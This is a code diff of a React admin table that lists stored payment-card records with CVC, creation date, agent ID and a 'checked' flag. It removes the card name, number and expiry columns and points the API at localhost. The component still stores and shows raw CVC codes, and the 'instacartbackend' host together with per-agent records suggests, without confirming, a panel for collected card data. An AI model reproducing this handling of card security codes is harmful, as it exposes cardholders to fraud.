@@ -19,7 +19,7 @@ import { toast } from 'react-toastify';
 import axios from 'axios';
 import Loader from '../components/Loader';
 import { useSelector } from 'react-redux';
-
+import moment from 'moment';
 const style = {
   position: 'absolute',
   top: '50%',
@@ -33,17 +33,16 @@ const style = {
 };
 function createData(
   Id,
-  Name,
- Number, 
  Cvc ,
- Expiration, 
+ createdAt,
  AgentId,
  Checked, 
  Action,
+
 ) {
-  return {Id, Name,Number, 
-    Cvc , Expiration, 
-    AgentId,Checked, Action };
+  return {Id,
+    Cvc , createdAt,
+    AgentId, Checked, Action };
 }
 
 const Credit = (props) => {
@@ -54,7 +53,7 @@ const Credit = (props) => {
   const [deleteId, setDeleteId] = useState('')
   const checkedButton= async ( checked)=> {
     try {
-        const response = await axios.post('https://instacartbackend.onrender.com/api/card/update', {checked, id:deleteId},{ headers: {
+        const response = await axios.post('http://localhost:5000/api/card/update', {checked, id:deleteId},{ headers: {
           'token': token
         }});
   
@@ -82,9 +81,11 @@ var creditArray = [...credit];
 var rows = [
 ];
 creditArray.map((cred)=> {
-  rows.push(createData(cred._id, cred.name, cred.number, cred.cvc,cred.expiration, cred.agentId, cred.checked ))
+  rows.push(createData(cred._id ,cred.cvc, cred.createdAt , cred.agentId, cred.checked ))
 })
-  
+const  formatDate = (date) => {
+  return moment(date).format('DD/MM/YYYY');
+}
 
   return (
     <div className='centerAgent'>
@@ -95,10 +96,9 @@ creditArray.map((cred)=> {
       <Table sx={{ minWidth: 650 }} aria-label="simple table">
         <TableHead>
           <TableRow>
-            <TableCell align="right">Name</TableCell>
-            <TableCell align="right">Number</TableCell>
             <TableCell align="right">Cvc</TableCell>
-            <TableCell align="right">Expiration</TableCell>
+            <TableCell align="right">CreatedAt</TableCell>
+
             <TableCell align="right">AgentId</TableCell>
             <TableCell align="right">Checked</TableCell>
             <TableCell align="right">Action</TableCell>
@@ -110,10 +110,9 @@ creditArray.map((cred)=> {
               key={row.Id}
               sx={{ '&:last-child td, &:last-child th': { border: 0 } }}
             >
-              <TableCell align="right">{row.Name}</TableCell>
-              <TableCell align="right"> {row.Number} </TableCell>
               <TableCell align="right">  {row.Cvc}</TableCell>
-              <TableCell align="right">  {row.Expiration}</TableCell>
+              <TableCell align="right">  {  formatDate(row.createdAt) }</TableCell>
+
               <TableCell align="right">  {row.AgentId}</TableCell>
              
          {row.Checked ?(        
